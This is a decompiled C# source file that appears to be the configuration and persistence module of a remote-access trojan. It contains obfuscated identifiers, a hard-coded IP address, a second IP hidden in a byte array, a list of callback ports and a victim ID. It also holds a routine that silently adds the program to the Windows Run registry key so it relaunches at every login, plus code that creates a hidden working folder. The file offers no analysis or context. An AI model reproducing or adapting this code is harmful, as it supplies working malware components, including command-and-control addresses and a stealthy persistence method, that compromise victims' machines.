using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace emrdhorausi;

internal static class DAONIF
{
	public static string emrdhorausimyPath = Application.get_ExecutablePath();

	public static string emrdhorausiappPath = "\\Mlbrmas\\|emrdhorausi".Split(new char[1] { '|' })[0];

	public static string emrdhorausidefaultP = "12.15.206.118|emrdhorausi".Split(new char[1] { '|' })[0];

	public static string emrdhorausimainApp = "emrdhorausi|emrdhorausi".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 2642, 6391, 9657, 12568, 14276 };

	public static byte[] emrdhorausivpsips = new byte[13]
	{
		49, 55, 51, 46, 50, 52, 57, 46, 53, 48,
		46, 53, 55
	};

	public static int emrdhorausiport;

	public static string emrdhorausipc_id = "gomude|emrdhorausi".Split(new char[1] { '|' })[0];

	public static string emrdhorausiremvUser = "ldokwnc|emrdhorausi".Split(new char[1] { '|' })[0];

	public static string emrdhorausifilesLogs = "lnword".Split(new char[1] { '|' })[0];

	public static string emrdhorausiAppPath = "";

	public static string emrdhorausiOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!emrdhorausi".Split(new char[1] { '!' })[0];
		}
	}

	public static void emrdhorausiset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|emrdhorausi".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = emrdhorausipc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string emrdhorausiget_mpath()
	{
		if (emrdhorausiAppPath != "")
		{
			return emrdhorausiAppPath;
		}
		emrdhorausiAppPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + emrdhorausiappPath;
		try
		{
			if (!Directory.Exists(emrdhorausiAppPath))
			{
				Directory.CreateDirectory(emrdhorausiAppPath);
			}
			if (Directory.Exists(emrdhorausiAppPath))
			{
				return emrdhorausiAppPath;
			}
		}
		catch
		{
		}
		emrdhorausiAppPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + emrdhorausiappPath;
		try
		{
			if (!Directory.Exists(emrdhorausiAppPath))
			{
				Directory.CreateDirectory(emrdhorausiAppPath);
			}
			if (!Directory.Exists(emrdhorausiAppPath))
			{
				return emrdhorausiAppPath;
			}
		}
		catch
		{
		}
		emrdhorausiAppPath = Application.get_ExecutablePath();
		return emrdhorausiAppPath;
	}
}
